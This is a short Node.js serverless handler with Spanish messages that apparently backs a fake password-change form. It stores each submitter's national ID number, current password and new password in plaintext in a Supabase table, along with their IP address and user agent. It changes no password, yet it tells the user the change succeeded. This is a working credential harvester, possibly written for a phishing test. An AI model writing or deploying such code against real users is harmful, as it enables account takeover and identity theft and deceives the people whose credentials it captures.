const { createClient } = require('@supabase/supabase-js');

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, mensaje: 'Método no permitido' });
  }

  if (!process.env.SUPABASE_URL || !process.env.SUPABASE_KEY) {
    console.error('Faltan variables de entorno SUPABASE_URL o SUPABASE_KEY');
    return res.status(500).json({ ok: false, mensaje: 'Error de configuración del servidor.' });
  }

  const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

  const { cedula, contrasena_actual, contrasena_nueva, confirmacion } = req.body || {};

  if (!cedula || !contrasena_actual || !contrasena_nueva || !confirmacion) {
    return res.status(400).json({ ok: false, mensaje: 'Por favor completá todos los campos.' });
  }

  if (contrasena_nueva !== confirmacion) {
    return res.status(400).json({ ok: false, mensaje: 'La nueva contraseña y la confirmación no coinciden.' });
  }

  const { error } = await supabase.from('test_envios').insert([{
    cedula,
    contrasena_actual,
    contrasena_nueva,
    confirmacion,
    contrasenas_coinciden: true,
    user_agent: req.headers['user-agent'] || null,
    ip: req.headers['x-forwarded-for'] || null,
  }]);

  if (error) {
    console.error('Supabase error:', error);
    return res.status(500).json({ ok: false, mensaje: 'Error al registrar el envío. Intente nuevamente.' });
  }

  return res.status(200).json({ ok: true, mensaje: 'Contraseña cambiada correctamente (prueba registrada).' });
};
